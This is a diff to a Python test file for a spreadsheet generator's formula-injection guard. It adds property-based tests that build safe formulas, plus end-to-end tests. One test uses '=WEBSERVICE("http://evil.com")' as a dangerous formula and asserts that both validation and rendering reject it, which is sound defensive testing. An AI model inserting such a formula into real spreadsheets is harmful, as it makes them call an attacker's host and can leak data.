@@ -1,7 +1,5 @@
 """Tests for Excel formula injection protection."""
 
-import contextlib
-
 import pytest
 from hypothesis import given
 from hypothesis import strategies as st
@@ -199,16 +197,69 @@ class TestRenderFormulaCustomInjection:
 class TestFormulaInjectionProperty:
     """Property-based tests for formula injection validation."""
 
-    @given(st.text(alphabet=st.characters(categories=("L", "N", "P", "S")), min_size=1, max_size=50))
-    def test_safe_arithmetic_never_rejected(self, content: str) -> None:
-        """Formulas containing only basic arithmetic chars should not be rejected,
-        unless they happen to match a dangerous pattern."""
-        # Build a formula from safe Excel arithmetic characters only
-        safe_chars = set("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+-*/()$.,: ")
-        formula = "=" + "".join(c for c in content if c in safe_chars)
-        if not formula.strip() or formula == "=":
-            return  # skip empty
-        # We can't guarantee no match (e.g., random chars could spell CMD),
-        # so this is a smoke test that the function doesn't crash
-        with contextlib.suppress(FormulaInjectionError):
-            validate_custom_formula(formula, "prop_test")
+    @given(
+        st.lists(
+            st.sampled_from(["SUM", "IF", "ROUND", "MAX", "MIN", "ABS", "AVERAGE"]),
+            min_size=1,
+            max_size=3,
+        ),
+        st.lists(st.integers(min_value=1, max_value=999), min_size=1, max_size=4),
+    )
+    def test_safe_function_formulas_never_rejected(self, funcs: list[str], nums: list[int]) -> None:
+        """Formulas built from known-safe Excel functions and cell refs must not raise."""
+        refs = [f"A{n}" for n in nums]
+        inner = ",".join(refs)
+        formula = "=" + "+".join(f"{f}({inner})" for f in funcs)
+        validate_custom_formula(formula, "prop_test")
+
+    @given(
+        st.lists(st.integers(min_value=1, max_value=999), min_size=2, max_size=6),
+        st.lists(
+            st.sampled_from(["+", "-", "*", "/"]),
+            min_size=1,
+            max_size=5,
+        ),
+    )
+    def test_pure_arithmetic_never_rejected(self, nums: list[int], ops: list[str]) -> None:
+        """Formulas with only cell refs and arithmetic operators must not raise."""
+        parts: list[str] = []
+        for i, n in enumerate(nums):
+            parts.append(f"A{n}")
+            if i < len(ops):
+                parts.append(ops[i])
+        formula = "=" + "".join(parts)
+        validate_custom_formula(formula, "prop_test")
+
+
+class TestFormulaInjectionEndToEnd:
+    """End-to-end: spec validation + render both block injection."""
+
+    def test_dangerous_formula_blocked_at_validation_and_render(self) -> None:
+        """A dangerous formula is caught by validate_spec and also by render_formula."""
+        dangerous = '=WEBSERVICE("http://evil.com")'
+        spec = make_spec_with_custom_formula(dangerous)
+
+        # Layer 1: spec validation catches it
+        errors = validate_spec(spec)
+        assert any("dangerous pattern" in e for e in errors)
+
+        # Layer 2: render_formula also catches it (defense-in-depth)
+        ctx = make_ctx()
+        with pytest.raises(FormulaInjectionError):
+            render_formula(
+                "custom",
+                {"formula": dangerous, "_line_item_key": "custom_item"},
+                ctx,
+            )
+
+    def test_safe_formula_passes_validation_and_renders(self) -> None:
+        """A safe formula passes both validation and rendering."""
+        safe = "={col_letter}$10*1.1"
+        spec = make_spec_with_custom_formula(safe)
+
+        errors = validate_spec(spec)
+        assert not any("dangerous" in e.lower() or "dde" in e.lower() for e in errors)
+
+        ctx = make_ctx()
+        result = render_formula("custom", {"formula": safe}, ctx)
+        assert result == "=D$10*1.1"
